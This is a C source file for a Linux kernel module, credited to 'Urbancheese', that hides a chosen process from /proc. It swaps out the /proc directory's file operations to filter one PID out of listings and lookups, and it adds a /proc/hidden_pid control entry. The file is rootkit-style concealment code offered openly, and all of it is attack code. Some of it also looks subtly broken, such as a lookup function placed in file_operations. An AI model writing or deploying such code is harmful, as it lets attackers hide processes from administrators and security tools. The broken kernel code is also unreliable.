#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/dcache.h>
#include <linux/namei.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/mutex.h>

static int hidden_pid = 0;
static DEFINE_MUTEX(proc_fops_lock);
static struct file_operations *orig_proc_fops = NULL;
static struct file_operations *new_proc_fops = NULL;

static int filter_actor(struct dir_context *ctx, const char *name, int namelen,
                        loff_t offset, u64 ino, unsigned d_type) {
    struct dir_context *orig_ctx = (struct dir_context *)ctx->private;
    int pid;

    if (kstrtoint(name, 10, &pid) == 0 && pid == hidden_pid)
        return 0;

    return orig_ctx->actor(orig_ctx, name, namelen, offset, ino, d_type);
}

static int my_proc_readdir(struct file *file, struct dir_context *ctx) {
    struct dir_context filter_ctx = {
        .actor = filter_actor,
        .pos = ctx->pos,
        .private = ctx,
    };
    int ret = orig_proc_fops->iterate_shared(file, &filter_ctx);
    ctx->pos = filter_ctx.pos;
    return ret;
}

static struct dentry *my_proc_lookup(struct inode *dir, struct dentry *dentry, unsigned int flags) {
    struct dentry *(*orig_lookup)(struct inode *, struct dentry *, unsigned int) =
        orig_proc_fops->lookup;

    int pid;
    if (kstrtoint(dentry->d_name.name, 10, &pid) == 0 && pid == hidden_pid)
        return ERR_PTR(-ENOENT);

    return orig_lookup(dir, dentry, flags);
}

static ssize_t hidden_pid_write(struct file *file, const char __user *buf, size_t len, loff_t *ppos) {
    char pid_str[16];
    if (len >= sizeof(pid_str))
        return -EINVAL;
    if (copy_from_user(pid_str, buf, len))
        return -EFAULT;
    pid_str[len] = '\0';
    kstrtoint(pid_str, 10, &hidden_pid);
    return len;
}

static const struct file_operations hidden_pid_fops = {
    .write = hidden_pid_write,
};

static int __init hideproc_init(void) {
    struct path proc_path;
    int ret = kern_path("/proc", 0, &proc_path);
    if (ret)
        return ret;

    struct inode *proc_inode = d_inode(proc_path.dentry);
    mutex_lock(&proc_fops_lock);

    orig_proc_fops = proc_inode->i_fop;
    new_proc_fops = kmalloc(sizeof(struct file_operations), GFP_KERNEL);
    if (!new_proc_fops) {
        mutex_unlock(&proc_fops_lock);
        path_put(&proc_path);
        return -ENOMEM;
    }

    memcpy(new_proc_fops, orig_proc_fops, sizeof(struct file_operations));
    new_proc_fops->iterate_shared = my_proc_readdir;
    new_proc_fops->lookup = my_proc_lookup;
    proc_inode->i_fop = new_proc_fops;

    mutex_unlock(&proc_fops_lock);
    path_put(&proc_path);

    proc_create("hidden_pid", 0200, NULL, &hidden_pid_fops);
    return 0;
}

static void __exit hideproc_exit(void) {
    struct path proc_path;
    if (!kern_path("/proc", 0, &proc_path)) {
        struct inode *proc_inode = d_inode(proc_path.dentry);
        mutex_lock(&proc_fops_lock);
        if (proc_inode->i_fop == new_proc_fops)
            proc_inode->i_fop = orig_proc_fops;
        mutex_unlock(&proc_fops_lock);
        path_put(&proc_path);
    }

    remove_proc_entry("hidden_pid", NULL);
    kfree(new_proc_fops);
}

module_init(hideproc_init);
module_exit(hideproc_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Urbancheese");
MODULE_DESCRIPTION("Hides a specified process from /proc");
